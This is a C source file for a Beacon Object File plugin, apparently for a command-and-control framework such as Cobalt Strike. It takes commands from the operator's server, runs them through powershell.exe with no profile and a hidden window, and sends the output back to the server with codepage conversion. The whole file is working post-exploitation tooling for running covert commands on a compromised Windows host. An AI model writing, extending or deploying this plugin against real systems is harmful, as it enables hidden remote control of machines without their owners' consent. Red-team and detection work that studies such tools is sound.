/*
 * powershell_exec.c - PowerShell command execution BOF plugin.
 *
 * Executes PowerShell commands without showing a window.
 * Uses powershell.exe -NoProfile -NonInteractive -WindowStyle Hidden -Command
 *
 * Build (MinGW-w64):
 *   x86_64-w64-mingw32-gcc -c powershell_exec.c -o powershell_exec.o
 *
 * Usage from server:
 *   Upload powershell_exec.o, set args = "Get-Process" or "Get-ComputerInfo" etc.
 */

#include <windows.h>
#include "beacon.h"

DECLSPEC_IMPORT BOOL  WINAPI KERNEL32$CreatePipe(PHANDLE, PHANDLE, LPSECURITY_ATTRIBUTES, DWORD);
DECLSPEC_IMPORT BOOL  WINAPI KERNEL32$CreateProcessA(LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCSTR, LPSTARTUPINFOA, LPPROCESS_INFORMATION);
DECLSPEC_IMPORT BOOL  WINAPI KERNEL32$ReadFile(HANDLE, LPVOID, DWORD, LPDWORD, LPOVERLAPPED);
DECLSPEC_IMPORT BOOL  WINAPI KERNEL32$CloseHandle(HANDLE);
DECLSPEC_IMPORT DWORD WINAPI KERNEL32$WaitForSingleObject(HANDLE, DWORD);
DECLSPEC_IMPORT BOOL  WINAPI KERNEL32$SetHandleInformation(HANDLE, DWORD, DWORD);
DECLSPEC_IMPORT int   WINAPI KERNEL32$MultiByteToWideChar(UINT, DWORD, LPCCH, int, LPWSTR, int);
DECLSPEC_IMPORT int   WINAPI KERNEL32$WideCharToMultiByte(UINT, DWORD, LPCWCH, int, LPSTR, int, LPCCH, LPBOOL);

#define HANDLE_FLAG_INHERIT_VAL 0x00000001
#define CP_ACP_VAL   0
#define CP_UTF8_VAL  65001

static void bof_memset(void* dst, int val, unsigned long long n) {
    unsigned char* p = (unsigned char*)dst;
    while (n--) *p++ = (unsigned char)val;
}

static int bof_strlen(const char* s) {
    int n = 0;
    while (s[n]) n++;
    return n;
}

static void bof_memcpy(void* dst, const void* src, unsigned long long n) {
    unsigned char* d = (unsigned char*)dst;
    const unsigned char* s = (const unsigned char*)src;
    while (n--) *d++ = *s++;
}

/*
 * Convert ACP (system codepage, e.g. GBK) bytes to UTF-8 and send via BeaconOutput.
 * ACP -> UTF-16 -> UTF-8
 */
static void output_acp_as_utf8(const char* acp_buf, int acp_len)
{
    if (acp_len <= 0) return;

    /* Step 1: ACP -> UTF-16 (get required wchar count) */
    int wlen = KERNEL32$MultiByteToWideChar(CP_ACP_VAL, 0, acp_buf, acp_len, NULL, 0);
    if (wlen <= 0) {
        /* Fallback: send raw bytes if conversion fails */
        BeaconOutput(CALLBACK_OUTPUT, (char*)acp_buf, acp_len);
        return;
    }

    /* Use stack buffer for small outputs, avoid malloc */
    WCHAR wbuf_stack[2048];
    WCHAR* wbuf = wbuf_stack;
    if (wlen > 2048) {
        /* Too large for stack — just send raw as fallback */
        BeaconOutput(CALLBACK_OUTPUT, (char*)acp_buf, acp_len);
        return;
    }

    KERNEL32$MultiByteToWideChar(CP_ACP_VAL, 0, acp_buf, acp_len, wbuf, wlen);

    /* Step 2: UTF-16 -> UTF-8 (get required byte count) */
    int u8len = KERNEL32$WideCharToMultiByte(CP_UTF8_VAL, 0, wbuf, wlen, NULL, 0, NULL, NULL);
    if (u8len <= 0) {
        BeaconOutput(CALLBACK_OUTPUT, (char*)acp_buf, acp_len);
        return;
    }

    char u8buf_stack[8192];
    char* u8buf = u8buf_stack;
    if (u8len > 8192) {
        BeaconOutput(CALLBACK_OUTPUT, (char*)acp_buf, acp_len);
        return;
    }

    KERNEL32$WideCharToMultiByte(CP_UTF8_VAL, 0, wbuf, wlen, u8buf, u8len, NULL, NULL);

    /* Send UTF-8 encoded output */
    BeaconOutput(CALLBACK_OUTPUT, u8buf, u8len);
}

void go(char* args, int alen)
{
    HANDLE hReadPipe  = NULL;
    HANDLE hWritePipe = NULL;
    SECURITY_ATTRIBUTES sa;
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    char buf[4096];
    DWORD bytesRead;

    /* Parse command from Beacon args (format: 2-byte len + string) */
    char cmd_line[2048];
    char* user_cmd = NULL;
    int user_cmd_len = 0;

    if (args != NULL && alen >= 2) {
        datap parser;
        BeaconDataParse(&parser, args, alen);
        user_cmd = BeaconDataExtract(&parser, &user_cmd_len);
    }

    if (user_cmd == NULL || user_cmd_len <= 0) {
        BeaconOutput(CALLBACK_ERROR, "No command provided\n", 20);
        return;
    }

    /* Build: powershell.exe -NoProfile -NonInteractive -WindowStyle Hidden -Command "<user_command>" */
    const char prefix[] = "powershell.exe -NoProfile -NonInteractive -WindowStyle Hidden -Command \"";
    const char suffix[] = "\"";
    int prefix_len = bof_strlen(prefix);
    int suffix_len = bof_strlen(suffix);

    if (prefix_len + user_cmd_len + suffix_len >= (int)sizeof(cmd_line) - 1) {
        BeaconOutput(CALLBACK_ERROR, "Command too long\n", 17);
        return;
    }

    bof_memcpy(cmd_line, prefix, prefix_len);
    bof_memcpy(cmd_line + prefix_len, user_cmd, user_cmd_len);
    bof_memcpy(cmd_line + prefix_len + user_cmd_len, suffix, suffix_len);
    cmd_line[prefix_len + user_cmd_len + suffix_len] = '\0';

    /* Create pipe */
    sa.nLength              = sizeof(sa);
    sa.lpSecurityDescriptor = NULL;
    sa.bInheritHandle       = TRUE;

    if (!KERNEL32$CreatePipe(&hReadPipe, &hWritePipe, &sa, 0)) {
        BeaconOutput(CALLBACK_ERROR, "CreatePipe failed\n", 18);
        return;
    }
    KERNEL32$SetHandleInformation(hReadPipe, HANDLE_FLAG_INHERIT_VAL, 0);

    /* STARTUPINFO: redirect stdout + stderr, hide window */
    bof_memset(&si, 0, sizeof(si));
    si.cb         = sizeof(si);
    si.dwFlags    = STARTF_USESTDHANDLES;
    si.hStdOutput = hWritePipe;
    si.hStdError  = hWritePipe;
    si.hStdInput  = NULL;

    bof_memset(&pi, 0, sizeof(pi));

    if (!KERNEL32$CreateProcessA(
            NULL, cmd_line, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi))
    {
        BeaconOutput(CALLBACK_ERROR, "CreateProcess failed\n", 20);
        KERNEL32$CloseHandle(hReadPipe);
        KERNEL32$CloseHandle(hWritePipe);
        return;
    }

    KERNEL32$CloseHandle(hWritePipe);
    KERNEL32$WaitForSingleObject(pi.hProcess, 30000); // 30 seconds timeout for PowerShell

    while (KERNEL32$ReadFile(hReadPipe, buf, sizeof(buf) - 1, &bytesRead, NULL) && bytesRead > 0) {
        buf[bytesRead] = '\0';
        /* Convert from system codepage (GBK/CP936) to UTF-8 */
        output_acp_as_utf8(buf, (int)bytesRead);
    }

    KERNEL32$CloseHandle(pi.hProcess);
    KERNEL32$CloseHandle(pi.hThread);
    KERNEL32$CloseHandle(hReadPipe);
}
